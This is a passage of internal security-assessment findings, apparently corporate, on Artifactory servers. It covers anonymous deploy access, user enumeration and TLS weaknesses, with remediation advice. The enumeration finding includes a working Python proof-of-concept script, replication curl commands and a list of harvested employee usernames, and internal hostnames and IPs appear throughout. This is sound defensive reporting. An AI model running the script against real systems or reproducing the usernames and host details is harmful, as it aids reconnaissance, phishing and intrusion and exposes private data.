- pypi-smi-statstracker-ingester-release-sj1
- pypi-th-dev-local
- pypi-th-dev-no1
- pypi-th-dev-or1
- pypi-th-dev-sj1
- pypi-tse-sdk-dev-local
- pypi-tse-sdk-dev-no1
- pypi-tse-sdk-dev-or1
- pypi-tse-sdk-dev-sj1
- pypi-tse-sdk-release-local
- pypi-tse-sdk-release-no1
- pypi-tse-sdk-release-or1
- pypi-tse-sdk-release-sj1
- rpm-edr-release-local
- rpm-edr-release-no1
- rpm-edr-release-or1
- rpm-edr-release-sj1
```

# Evidence:
## Request
```
GET /artifactory/ui/repodata?deploy=true HTTP/1.1
Host: artifactory.corp.adobe.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Connection: keep-alive
```

## Response
```
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 20:00:19 GMT
Content-Type: application/json
Connection: keep-alive
X-JFrog-Version: Artifactory/7.63.21 76321900
X-Artifactory-Id: 095d6c039c985b29af09053ab1cbc068786681c8
X-Artifactory-Node-Id: or1dra936.corp.adobe.com
Access-Control-Allow-Methods: GET, POST, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, Content-Type, X-Codingpedia
Cache-Control: no-store
SessionValid: false
Content-Length: 978

{"repoTypesList":[{"repoKey":"pypi-gentech-tools-release-local","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-no1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-or1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-sj1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"}],"fileUploadMaxSizeMb":500}
```

# Replicate Finding:
Run the following command: `curl -kL-Xs -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46' 'https://artifactory.corp.adobe.com/artifactory/ui/repodata?deploy=true'`

# Mitigation/Remediation:
We recommend disabling anonymous access to JFrog Artifactory. This can be achieved by updating the Artifactory configuration to require authentication for accessing the repositories. The following steps can be followed to disable anonymous access:

1. Log in to the JFrog Artifactory administration console.
2. Navigate to 'Admin' > 'Security' > 'General'.
3. Disable the 'Allow Anonymous Access' option.
4. Save the changes.

Additionally, it is recommended to review and update the permissions for each repository to ensure that only authorized users have access to them. Implementing role-based access control (RBAC) can help to manage permissions effectively. Lastly, we recommend the following:
- Enable logging and monitoring of repository activity to detect unusual uploads.
- Implement signed artifacts and enforce artifact validation to ensure their integrity before deployment.

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://owasp.org/www-project-developer-guide/draft/foundations/secure_development/
4. https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/
5. https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization
6. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
7. https://cwe.mitre.org/data/definitions/732.html
8. [JFrog Artifactory Security Best Practices](https://www.jfrog.com/confluence/display/JFROG/Security+Best+Practices)
9. [JFrog Artifactory User Guide](https://www.jfrog.com/confluence/display/JFROG/JFrog+Artifactory)

---
# Risk: High (8.8)
**CVSS:3.1**`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Explanation:**
- **Attack Vector (AV:A)**: Adjacent. The attacker needs to be on the VPN.
- **Attack Complexity (AC:L)**: Low. No special conditions or access to systems are required.
- **Privileges Required (PR:N)**: None. Some limited privileges, such as anonymous user access to repository deployment, are required.
- **User Interaction (UI:N)**: No user interaction is needed for exploitation.
- **Scope (S:U)**: Unchanged. The exploited vulnerability affects only the vulnerable component.
- **Confidentiality Impact (C:H)**: High. An attacker can access sensitive data.
- **Integrity Impact (I:H)**: High. An attacker can alter the repository contents.
- **Availability Impact (A:H)**: High. Malicious files can disrupt the availability of services.

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had allowed anonymous users to uploaded code to the platform. Allowing anonymous users to deploy files to a repository in **Artifactory** presents a significant security risk. By allowing anonymous access, attackers could upload malicious artifacts such as backdoored binaries, malware, or unauthorized code. This could lead to the distribution of compromised components across an organization or even the wider development ecosystem, exposing downstream users to security risks.

# Impact:
If attackers leverage the ability to deploy files as anonymous users, they could introduce malicious artifacts into critical repositories. This could compromise the integrity of the software supply chain, resulting in widespread exploitation. Attackers could upload malicious code disguised as legitimate software updates, inject backdoors, or disrupt system operations by causing services dependent on the repository to consume malicious artifacts. This could result in:
- Data breaches by injecting trojan code.
- Compromised software builds leading to unauthorized access.
- Denial of service if malicious binaries crash dependent applications.

# Affected Assets:
## Affected Host(s):
- 10.40.102.10 (artifactory-no1.corp.adobe.com) [443/tcp]

# Evidence:
## Request
```
GET /artifactory/ui/repodata?deploy=true HTTP/1.1
Host: artifactory.corp.adobe.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Connection: keep-alive
```

## Response
```
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 20:00:19 GMT
Content-Type: application/json
Connection: keep-alive
X-JFrog-Version: Artifactory/7.63.21 76321900
X-Artifactory-Id: 095d6c039c985b29af09053ab1cbc068786681c8
X-Artifactory-Node-Id: or1dra936.corp.adobe.com
Access-Control-Allow-Methods: GET, POST, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, Content-Type, X-Codingpedia
Cache-Control: no-store
SessionValid: false
Content-Length: 978

{"repoTypesList":[{"repoKey":"pypi-gentech-tools-release-local","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-no1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-or1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-sj1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"}],"fileUploadMaxSizeMb":500}
```

# Replicate Finding:
Run the following command: `curl -kL-Xs -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46' 'https://artifactory.corp.adobe.com/artifactory/ui/repodata?deploy=true'`

# Mitigation/Remediation:
We recommend disabling anonymous deployments in Artifactory. Configure the repository permissions to restrict file deployment only to authenticated users with appropriate roles.

**Sample configuration:**
1. Disable anonymous access:
   ```bash
   artifactory.security.allowAnonymous=false
   ```
2. Define user roles for repository deployment:
   ```bash
   # Assign roles to users
   artifactory.security.permissions.repoDeploy = "developers,devops"
   ```
3. Use repository access tokens for automated deployments instead of allowing any user to deploy without authentication.

**Additional Mitigation:**
- Enable logging and monitoring of repository activity to detect unusual uploads.
- Implement signed artifacts and enforce artifact validation to ensure their integrity before deployment.

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://owasp.org/www-project-developer-guide/draft/foundations/secure_development/
4. https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/
5. https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization
6. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
7. https://cwe.mitre.org/data/definitions/732.html

---
# Risk: Medium (6.5)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`

**Explanation**:  
This vulnerability allows an anonymous attacker to enumerate users by leveraging the "Deployed By" value of artifacts in Artifactory. The attack is possible over the network (AV:N), with no special access or privileges required (PR:N), and does not need user interaction (UI:N). The complexity of the attack is low (AC:L), and the scope remains unchanged (S:U) because it only affects the confidentiality and integrity of user information. The potential disclosure of usernames or identifiable information results in a low impact on confidentiality (C:L), and similarly, the ability to list users may allow for low integrity impact (I:L). There is no direct effect on availability (A:N).

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had user enumration vulnerability. Specifically, the Artifactory instance allowed an anonimous user to enumarate users on the instance. In Artifactory, the ability to list users is restricted to administrative roles. However, by exploiting the "Deployed By" value attached to artifacts, an anonymous user can enumerate active users who have deployed artifacts. This loophole allows for the disclosure of sensitive information that could lead to user profiling and potentially pave the way for more advanced attacks like credential stuffing or targeted phishing.

# Impact:
If an attacker leverages this vulnerability, they can gather a list of active users deploying artifacts. This information can be used to mount follow-up attacks, such as spear-phishing or brute-force attempts against these users. In particular, knowledge of the usernames or deployment accounts can assist attackers in narrowing down their targets, gaining further access, or impersonating these users for malicious actions like unauthorized deployments. Additionally, exposure of user activity might breach internal confidentiality policies and give adversaries an advantage when conducting internal reconnaissance.

# Affected Assets:
## Affected Host(s):
- 10.50.227.144 (or1dra824.corp.adobe.com) [443/tcp]

# Evidence:
```
There are 1274 repositories to process
Found user naprice
Found user _system_
Found user all43103
Found user scmutl
Found user klein
Found user edropgeneric
Found user ajeng
Found user ram
Found user psftp
Found user vpaul
Found user parshev
Found user jsisson
Found user asiruwa
Found user tsackett
Found user mgummadam
Found user sgooch
Found user jwiltse
Found user duran
Found user kwright
Found user wyles
Found user jhall
Found user demeeste
Found user zolesio
Found user barmand
Found user kanikgup
Found user jespuser
Found user briard
Found user mendezac
Found user emittal
Found user rpmbldr
Found user madhgupt
Found user aaagrawa
Found user aeartif
Found user amorgen
Found user vpotapye
Found user amitg
Found user jgjerde
Found user davkaur
Found user irmina
Found user dimfeld
Found user sakhande
Found user gauntlet
Found user insuafer
Found user volteanu
Found user kpatters
Found user agutierr
Found user uploader
Found user vitrano
Found user piejnkns
Found user bgardner
```

# Replicate Finding:
1. Save the following PoC:
```python
#!/usr/bin/env python3
import requests
import json
import urllib3
import sys

# SUPPRESS WARNINGS ############################################################
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ADD USER #####################################################################
def check_users(details):
    global users
    if 'createdBy' not in details:
        return

    if details['createdBy'] not in users:
        print('Found user {}'.format(details['createdBy']))
        users.append(details['createdBy'])
    if details['modifiedBy'] not in users:
        print('Found user {}'.format(details['modifiedBy']))
        users.append(details['modifiedBy'])

# Function to safely load JSON
def safe_load_json(response_text):
    try:
        return json.loads(response_text)
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON: {e}")
        print(f"Response content: {response_text[:200]}")  # Print first 200 characters for debugging
        return None

# MAIN #########################################################################
url = sys.argv[1].rstrip('/')

session = requests.Session()
response = session.get(url + '/api/repositories', verify=False)

# Safely load JSON
repositories = safe_load_json(response.text)
if repositories is None:
    sys.exit(1)  # Exit if JSON is invalid

users = []

print('There are {} repositories to process'.format(len(repositories)))
for repository in repositories:
    try:
        response = session.get(url + '/api/storage/' + repository['key'], verify=False)
        if 'json' not in response.headers['Content-Type']:
            continue
        rep = safe_load_json(response.text)
        if rep is None:
            continue

        for child in rep['children']:
            uri = child['uri']
            response = session.get(url + '/api/storage/' + repository['key'] + uri, verify=False)
            if 'json' not in response.headers['Content-Type']:
                continue
            details = safe_load_json(response.text)
            if details is None:
                continue
            check_users(details)
    except Exception as e:
        print(f"An error occurred: {e}")
```
2. Change the file properties: `chmod +x artifactory_list_users.py`
3. Run the exploit code: `./artifactory_list_users.py "https://artifactory.corp.adobe.com/artifactory/"`

# Mitigation/Remediation:
We recommend restricting access to the “Deployed By” field so that only administrators can view it. Additionally, limit anonymous users’ ability to access any metadata associated with artifacts. Artifactory administrators should consider implementing a permissions check that validates a user’s privilege before displaying user-related data fields in the UI and API responses. Implementing security controls around API access is also critical, including using proper authorization tokens for actions that expose sensitive information. Further mitigation strategies include disabling anonymous access to Artifactory instances and using multi-factor authentication (MFA) for all deploying users.

**Sample Code for Mitigation (Pseudocode)**:
```javascript
if (user.role !== 'admin') {
   hideField('Deployed By');
}
```

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://cwe.mitre.org/data/definitions/202.html
4. https://owasp.org/Top10/A05_2021-Security_Misconfiguration/


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/README.md
---

Include supporting artifacts for the assessment
- https://jira.corp.adobe.com/browse/PASS-20309
- https://jira.corp.adobe.com/browse/VULN-28560
- https://wiki.corp.adobe.com/display/Artifactory/Anonymous+Access
- https://wiki.corp.adobe.com/pages/viewpage.action?spaceKey=Artifactory&title=Active+Artifactory+Remote+Repos
- https://wiki.corp.adobe.com/pages/viewpage.action?spaceKey=Artifactory&title=Access
- Threat hunt documentation: https://jira.corp.adobe.com/browse/UDVT-2655

Corp (Stage)

|**Location**|**Artifactory UI**|**Docker URI**|
|---|---|---|
|Hillsboro  <br>(or1)|artifactory-stg.corp.adobe.com|_<repo>_.dr-stg.corp.adobe.com|

Corp (Prod)

|||**Location**|**Artifactory UI**|**Docker URI**|
|---|---|---|---|---|
|||Hillsboro  <br>(or1)|artifactory.corp.adobe.com|_<repo>_.dr.corp.adobe.com|
|||San Jose  <br>(sj1)|artifactory-sj1.corp.adobe.com|_<repo>_.dr-sj1.corp.adobe.com|
|||Noida  <br>(no1)|artifactory-no1.corp.adobe.com|_<repo>_.dr-no1.corp.adobe.com|

Cloud (Stage)

|**Location**|**Artifactory UI**|**Docker URI**|
|---|---|---|
|us-west-2  <br>(or2)|artifactory-stg.adobeitc.com|_<repo>_.dr-stg.adobeitc.com|
|East US 2  <br>(va7)|artifactory-stg.azr0108.adobeitc.com|_<repo>_.dr-stg.azr0108.adobeitc.com|

Cloud (Prod)

AWS

|**Location**|**Artifactory UI**|**Docker URI**|
|---|---|---|
|us-west-2  <br>(or2)|artifactory-uw2.adobeitc.com|_<repo>_.dr-uw2.adobeitc.com|
|us-east-1  <br>(va6)|artifactory-ue1.adobeitc.com|_<repo>_.dr-ue1.adobeitc.com|
|eu-west-1  <br>(irl1)|artifactory-ew1.adobeitc.com|_<repo>_.dr-ew1.adobeitc.com|

Azure

|**Location**|**Artifactory UI**|**Docker URI**|
|---|---|---|
|East US 2  <br>(va7)|artifactory-va7.adobeitc.com|_<repo>_.dr-va7.adobeitc.com|


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Draft/Artifactory Access - Security Web App Template - High (7.1).md
---

# Risk: High (7.1)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had `insert attack her`. Specifically, `explain vulnerability here`

# Impact:
If uncovered by an attacker...

# Affected Assets:
## Affected Host(s):
- 127.0.0.1 (localhost) [22/tcp]
- 127.0.0.1 (localhost) [22/udp]

# Evidence:
Insert evidence here

# Replicate Finding:
1. Clone the impacted repo: `git clone git@git.corp.adobe.com:ORG/repo.git`
2. Navigate into the noted repo
3. Open the impacted file(s)
4. Got to impacted line

# Mitigation/Remediation:
We recommend...

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Draft/Artifactory Access - Security Code Review Template - High (7.1).md
---

# Risk: High (7.1)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While perfoming a security code review of `Artifactory`, we observed the noted code repo had `insert attack here`

# Impact:
If uncovered by an attacker...

# Affected Assets:
## Affected File(s):
- file://path/to/file:N

# Evidence:
Insert evidence here

# Replicate Finding:
1. Clone the impacted repo: `git clone git@git.corp.adobe.com:ORG/repo.git`
2. Navigate into the noted repo
3. Open the impacted file(s)
4. Got to impacted line

# Mitigation/Remediation:
We recommend...

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Draft/Dropped/Artifactory Access - Inadequate Encryption Strength - TLS-SSL Security Misconfiguration & Weak Ciphers  - artifactory-uw2.adobeitc.com - High (7.5).md
---

# Risk: High (7.5) 
**CVSS Vector CVSS:3.1`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

1. **cipherlist_AVERAGE**  
   CVSSv3 Score: **4.0 (Medium)**  
   Vector: **AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N**

2. **DNS_CAArecord**  
   CVSSv3 Score: **4.3 (Medium)**  
   Vector: **AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N**

3. **HSTS**  
   CVSSv3 Score: **5.0 (Medium)**  
   Vector: **AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N**

4. **insecure_redirect**  
   CVSSv3 Score: **6.1 (Medium)**  
   Vector: **AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H**

5. **LUCKY13**  
   CVSSv3 Score: **3.7 (Low)**  
   Vector: **AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N**

6. **OCSP_stapling**  
   CVSSv3 Score: **4.0 (Medium)**  
   Vector: **AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N**

7. **secure_client_renego**  
   CVSSv3 Score: **4.0 (Medium)**  
   Vector: **AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N**

8. **security_headers**  
   CVSSv3 Score: **5.3 (Medium)**  
   Vector: **AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L**

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security code review of `Project Neo`, we observed the noted web application had several TLS/SSL related issues. Specifically, the noted web application was susceptible to the following issues:
1. **cipherlist_AVERAGE**: A suboptimal cipher suite list is configured, including weak or outdated algorithms like RC4, DES, or 3DES, which provide insufficient security for modern cryptographic standards.
2. **DNS_CAArecord**: The DNS CAA (Certification Authority Authorization) record is missing. This record restricts which Certificate Authorities (CAs) can issue certificates for the domain, preventing misissuance of certificates by unauthorized CAs.
3. **HSTS**: The server does not implement HTTP Strict Transport Security (HSTS). HSTS ensures that browsers only communicate with the server using secure HTTPS connections, preventing downgrade attacks.
4. **insecure_redirect**: HTTP-to-HTTPS redirection is misconfigured, allowing attackers to intercept traffic via man-in-the-middle attacks before the connection is redirected to HTTPS.
5. **LUCKY13**: The TLS implementation may be vulnerable to the LUCKY13 attack, which exploits padding oracle vulnerabilities in CBC-mode ciphers, enabling an attacker to recover plaintext under specific conditions.
6. **OCSP_stapling**: The server does not support OCSP stapling, which allows the server to provide certificate status to clients during the TLS handshake, avoiding the need for clients to query an external OCSP server.
7. **secure_client_renego**: Client-initiated renegotiation is not disabled. This could allow attackers to perform denial-of-service attacks or downgrade connections if they exploit this feature.
8. **security_headers**: The server does not include important security headers such as X-Frame-Options, X-Content-Type-Options, and Content-Security-Policy, which protect against cross-site scripting (XSS), clickjacking, and MIME sniffing attacks.

# Impact:
1. **cipherlist_AVERAGE**; Attackers may exploit weak ciphers to decrypt sensitive data or impersonate the server, compromising the confidentiality and integrity of the data transmitted between clients and the server.
2. **DNS_CAArecord**: Without a CAA record, any Certificate Authority could issue a certificate for the domain, increasing the risk of a malicious or rogue CA issuing fraudulent certificates.
3. **HSTS**: A lack of HSTS allows attackers to downgrade HTTPS requests to HTTP, enabling man-in-the-middle attacks and exposing sensitive data during transmission.
4. **insecure_redirect**: Attackers can intercept the HTTP traffic and perform man-in-the-middle attacks before the insecure HTTP traffic is redirected to HTTPS.
5. **LUCKY13**: Attackers can potentially exploit timing side-channel vulnerabilities to decrypt TLS traffic, though the practical exploitation is limited due to the complexity of the attack.
6. **OCSP_stapling**: Without OCSP stapling, clients must directly query the CA for certificate revocation status, potentially exposing them to denial-of-service attacks or accepting a revoked certificate.
7. **secure_client_renego**: If client renegotiation is left enabled, attackers could exploit it to perform a denial-of-service attack or intercept session information.
8. **security_headers**: Missing security headers expose the web application to various attacks such as XSS, clickjacking, and MIME sniffing, which can lead to data theft, session hijacking, or compromised user accounts.
   
# Affected Assets:
## Affected Host(s)
1. 35.161.24.87 ((artifactory-uw2.adobeitc.com) ([443/tcp]
2. 35.163.52.97 ((artifactory-uw2.adobeitc.com) ([443/tcp]
3. 35.163.52.97 ((artifactory-uw2.adobeitc.com) ([443/tcp]
4. 35.164.234.86 (artifactory-uw2.adobeitc.com) ([443/tcp]
5. 35.83.68.61 (artifactory-uw2.adobeitc.com) ([443/tcp]
6. 44.224.138.44 (artifactory-uw2.adobeitc.com) ([443/tcp]
7. 44.232.11.135 (artifactory-uw2.adobeitc.com) ([443/tcp]
8. 44.232.74.35 ((artifactory-uw2.adobeitc.com) ([443/tcp]
9. 52.33.92.242 ((artifactory-uw2.adobeitc.com) ([443/tcp]
10. 52.89.174.215 (artifactory-uw2.adobeitc.com) ([443/tcp]
11. 54.69.227.215 (artifactory-uw2.adobeitc.com) ([443/tcp]

# Evidence:
| ip            | fqdn                         | port | severity | id                   | finding                                                             | cve           | cwe     |
|---------------|------------------------------|------|----------|----------------------|---------------------------------------------------------------------|---------------|---------|
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 35.161.24.87  | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 35.164.234.86 | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 52.89.174.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 44.224.138.44 | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
